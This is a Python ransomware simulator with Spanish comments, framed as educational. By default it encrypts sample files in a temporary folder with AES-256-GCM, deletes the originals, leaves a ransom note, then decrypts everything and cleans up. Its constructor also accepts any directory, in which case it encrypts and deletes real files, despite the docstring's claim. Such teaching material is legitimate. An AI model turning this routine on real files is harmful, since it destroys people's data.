"""
Simulador de Ransomware (Entorno Controlado)

AVISO IMPORTANTE:
    Este codigo es EXCLUSIVAMENTE EDUCATIVO. Simula el comportamiento
    de un ransomware para entender como funcionan, pero NO cifra archivos
    reales. En su lugar, trabaja sobre una carpeta temporal con archivos
    de prueba que el propio script crea.

    Usar ransomware real contra sistemas sin autorizacion es un DELITO
    GRAVE que puede acarrear penas de carcel.

Explicacion humana:
    Un ransomware hace 3 cosas:
    1. Cifra todos tus archivos con una clave que solo el atacante conoce
    2. Te deja una "nota de rescate" pidiendo dinero (normalmente Bitcoin)
    3. Si pagas, te da la clave para descifrar (o no, depende del atacante)

    Aqui simulamos ese proceso de forma segura para estudiar las tecnicas
    de cifrado, propagacion y los puntos debiles del ransomware.
"""

import os
import json
import base64
import tempfile
import shutil
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class RansomwareSimulator:
    """Simulador de ransomware en entorno controlado."""

    RANSOM_NOTE = """
    ===================================================
    TUS ARCHIVOS HAN SIDO CIFRADOS (SIMULACION)
    ===================================================

    Esto es una SIMULACION educativa.
    En un ataque real, aqui apareceria una direccion
    de Bitcoin y un plazo para pagar.

    Para descifrar tus archivos, usa la clave de
    recuperacion que se genero al ejecutar el script.
    ===================================================
    """

    def __init__(self, target_dir=None):
        # Si no se especifica, creamos un directorio temporal SEGURO
        if target_dir is None:
            self.target_dir = tempfile.mkdtemp(prefix="ransomware_lab_")
            self._create_sample_files()
        else:
            self.target_dir = target_dir

        self.key = AESGCM.generate_key(bit_length=256)
        self.encrypted_files = []
        self.extension = ".locked"

    def _create_sample_files(self):
        """Crea archivos de prueba en el directorio temporal."""
        samples = {
            "documento_importante.txt": "Este es un documento muy importante con datos sensibles.",
            "fotos_vacaciones.txt": "Simulacion de un archivo de fotos (en texto).",
            "contabilidad.csv": "fecha,concepto,importe\n2024-01-01,Nomina,2500\n2024-01-15,Alquiler,-800",
            "notas_personales.txt": "Mis notas privadas que no quiero perder.",
            "proyecto_trabajo.txt": "Codigo fuente del proyecto en el que llevo 6 meses trabajando."
        }
        for filename, content in samples.items():
            filepath = os.path.join(self.target_dir, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)

    def encrypt_file(self, filepath):
        """Cifra un archivo individual con AES-256-GCM."""
        try:
            with open(filepath, 'rb') as f:
                plaintext = f.read()

            aesgcm = AESGCM(self.key)
            nonce = os.urandom(12)
            ciphertext = aesgcm.encrypt(nonce, plaintext, None)

            # Guardamos nonce + ciphertext
            encrypted_path = filepath + self.extension
            with open(encrypted_path, 'wb') as f:
                f.write(nonce + ciphertext)

            # Eliminamos el archivo original
            os.remove(filepath)
            self.encrypted_files.append(encrypted_path)
            return True
        except Exception:
            return False

    def decrypt_file(self, encrypted_path, key=None):
        """Descifra un archivo usando la clave de recuperacion."""
        if key is None:
            key = self.key

        try:
            with open(encrypted_path, 'rb') as f:
                data = f.read()

            nonce = data[:12]
            ciphertext = data[12:]

            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)

            # Restauramos el archivo original
            original_path = encrypted_path.replace(self.extension, "")
            with open(original_path, 'wb') as f:
                f.write(plaintext)

            os.remove(encrypted_path)
            return True
        except Exception:
            return False

    def simulate_attack(self):
        """Simula el ataque completo de ransomware."""
        print("[!] SIMULACION DE ATAQUE RANSOMWARE")
        print(f"[*] Directorio objetivo: {self.target_dir}\n")

        # Fase 1: Enumerar archivos
        target_files = []
        for f in os.listdir(self.target_dir):
            filepath = os.path.join(self.target_dir, f)
            if os.path.isfile(filepath) and not f.endswith(self.extension):
                target_files.append(filepath)

        print(f"[*] Archivos encontrados: {len(target_files)}")

        # Fase 2: Cifrar
        for filepath in target_files:
            success = self.encrypt_file(filepath)
            if success:
                print(f"  [+] Cifrado: {os.path.basename(filepath)}")

        # Fase 3: Dejar nota de rescate
        note_path = os.path.join(self.target_dir, "README_RESCATE.txt")
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(self.RANSOM_NOTE)

        recovery_key = base64.b64encode(self.key).decode()
        print(f"\n[*] Clave de recuperacion: {recovery_key}")
        print(f"[*] Archivos cifrados: {len(self.encrypted_files)}")

        return {
            "files_encrypted": len(self.encrypted_files),
            "recovery_key": recovery_key,
            "target_dir": self.target_dir
        }

    def simulate_recovery(self):
        """Simula la recuperacion (como si la victima pagara)."""
        print("\n[*] SIMULACION DE RECUPERACION")

        recovered = 0
        for encrypted_path in list(self.encrypted_files):
            if self.decrypt_file(encrypted_path):
                print(f"  [+] Recuperado: {os.path.basename(encrypted_path)}")
                recovered += 1

        self.encrypted_files.clear()
        print(f"\n[+] Archivos recuperados: {recovered}")
        return recovered

    def cleanup(self):
        """Limpia el directorio temporal."""
        if self.target_dir and os.path.exists(self.target_dir):
            shutil.rmtree(self.target_dir)


if __name__ == "__main__":
    print("=== Simulador de Ransomware (Educativo) ===\n")

    sim = RansomwareSimulator()

    try:
        # Fase de ataque
        result = sim.simulate_attack()

        # Fase de recuperacion
        sim.simulate_recovery()
    finally:
        # Siempre limpiamos
        sim.cleanup()
        print("\n[*] Directorio temporal eliminado. Simulacion completada.")
